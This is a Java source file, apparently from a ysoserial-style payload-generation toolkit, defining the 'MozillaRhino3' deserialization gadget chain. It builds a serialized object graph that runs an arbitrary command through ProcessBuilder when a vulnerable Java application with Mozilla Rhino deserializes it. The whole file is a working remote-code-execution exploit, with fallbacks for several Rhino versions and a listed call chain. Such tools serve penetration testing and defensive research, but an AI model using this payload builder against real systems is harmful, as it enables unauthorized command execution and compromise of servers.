package org.ses.gadgetbuilder.chains1;

import org.mozilla.javascript.*;
import org.mozilla.javascript.tools.shell.Environment;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.NoTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.Hashtable;
import java.util.Map;


/**
 * <a href="https://github.com/frohoff/ysoserial/pull/192/commits/08c2178a77a10cef9417a480e67d92441c6dec3c">...</a>
 */
@Dependencies({"org.mozilla.rhino.1.7.13"})
@Authors({ Authors.TINT0 })
@Impact(Impact.RCE)
public class MozillaRhino3 extends GadgetChain<NoTrampoline> {

    public MozillaRhino3() {
        super(NoTrampoline.getInstance());
    }

    public MozillaRhino3(NoTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        command = "var rt= new java.lang.ProcessBuilder(); rt.command('"+command+"');rt.start();";

        Class nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
        Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
        nativeErrorConstructor.setAccessible(true);
        IdScriptableObject idScriptableObject = (IdScriptableObject) nativeErrorConstructor.newInstance();

        ScriptableObject dummyScope = new Environment();
        Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
        Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);
        Context context = Context.enter();

        Object initContextMemberBox = Reflections.createWithConstructor(
                Class.forName("org.mozilla.javascript.MemberBox"),
                (Class<Object>)Class.forName("org.mozilla.javascript.MemberBox"),
                new Class[] {Method.class},
                new Object[] {Context.class.getMethod("enter")});

        ScriptableObject scriptableObject = new Environment();
        (new ClassCache()).associate(scriptableObject);
        try {
            Constructor ctor1 = LazilyLoadedCtor.class.getDeclaredConstructors()[1];
            ctor1.setAccessible(true);
            ctor1.newInstance(scriptableObject, "java",
                    "org.mozilla.javascript.NativeJavaTopPackage", false, true);
        }catch(ArrayIndexOutOfBoundsException e){
            Constructor ctor1 = LazilyLoadedCtor.class.getDeclaredConstructors()[0];
            ctor1.setAccessible(true);
            ctor1.newInstance(scriptableObject, "java",
                    "org.mozilla.javascript.NativeJavaTopPackage", false);
        }


        Interpreter interpreter = new Interpreter();
        Method mt = Context.class.getDeclaredMethod("compileString", String.class, Evaluator.class, ErrorReporter.class, String.class, int.class, Object.class);
        mt.setAccessible(true);
        Script script = (Script) mt.invoke(context, new Object[]{ command,interpreter, null,"test", 0, null});

        Constructor<?> ctor = Class.forName("org.mozilla.javascript.NativeScript").getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        Object nativeScript = ctor.newInstance(script);
        Method setParent = ScriptableObject.class.getDeclaredMethod("setParentScope", Scriptable.class);
        setParent.invoke(nativeScript, scriptableObject);

        try {
            //1.7.13
            Method makeSlot = ScriptableObject.class.getDeclaredMethod("findAttributeSlot", String.class, int.class, Class.forName("org.mozilla.javascript.ScriptableObject$SlotAccess"));
            Object getterEnum = Class.forName("org.mozilla.javascript.ScriptableObject$SlotAccess").getEnumConstants()[3];
            makeSlot.setAccessible(true);
            Object slot = makeSlot.invoke(idScriptableObject, "getName", 0, getterEnum);
            Reflections.setFieldValue(slot, "getter", initContextMemberBox);
        }catch(ClassNotFoundException e){
            try {
                //1.7R2
                Method makeSlot = ScriptableObject.class.getDeclaredMethod("findAttributeSlot", String.class, int.class, int.class);
                makeSlot.setAccessible(true);
                Object slot = makeSlot.invoke(idScriptableObject, "getName", 0, 4);
                Reflections.setFieldValue(slot, "getter", initContextMemberBox);
            }catch(NoSuchMethodException ee) {
                //1.7.7.2
                Method makeSlot = ScriptableObject.class.getDeclaredMethod("createSlot", Object.class, int.class, int.class);
                makeSlot.setAccessible(true);
                Object slot = makeSlot.invoke(idScriptableObject, "getName", 0, 4);
                Reflections.setFieldValue(slot, "getter", initContextMemberBox);
            }
        }

        idScriptableObject.setGetterOrSetter("directory", 0, (Callable) nativeScript, false);

        NativeJavaObject nativeJavaObject = new NativeJavaObject();
        Reflections.setFieldValue(nativeJavaObject, "parent", dummyScope);
        Reflections.setFieldValue(nativeJavaObject, "isAdapter", true);
        Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject",
                this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));

        Reflections.setFieldValue(nativeJavaObject, "javaObject", idScriptableObject);

        return new TrampolineConnector(nativeJavaObject);
    }

    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
        out.writeObject("java.lang.Object");
        out.writeObject(new String[0]);
        out.writeObject(javaObject);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.mozilla.javascript.NativeJavaObject.readObject()\n"+
                "java.lang.Method.invoke() -> statically defined reflective call target: org.mozilla.javascript.JavaAdapter.readAdapterObject\n"+
                "org.mozilla.javascript.JavaAdapter.readAdapterObject()\n"+
                "org.mozilla.javascript.JavaAdapter.getAdapterClass()\n"+
                "org.mozilla.javascript.JavaAdapter.getObjectFunctionNames()\n"+
                "org.mozilla.javascript.ScriptableObject.getProperty()\n"+
                "org.mozilla.javascript.IdScriptableObject.get()\n"+
                "org.mozilla.javascript.ScriptableObject.get()\n"+
                "org.mozilla.javascript.ScriptableObject.getImpl()\n"+
                "org.mozilla.javascript.NativeScript.call()\n"+
                "org.mozilla.javascript.InterpretedFunction.exec()\n"+
                "org.mozilla.javascript.ScriptRuntime.doTopCall()\n"+
                "org.mozilla.javascript.ContextFactory.doTopCall()\n"+
                "org.mozilla.javascript.InterpretedFunction.call()\n"+
                "org.mozilla.javascript.Interpreter.interpret()\n"+
                "org.mozilla.javascript.Interpreter.interpretLoop()\n"+
                "...\n"+
                "java.lang.ProcessBuilder.start()";
    }

}
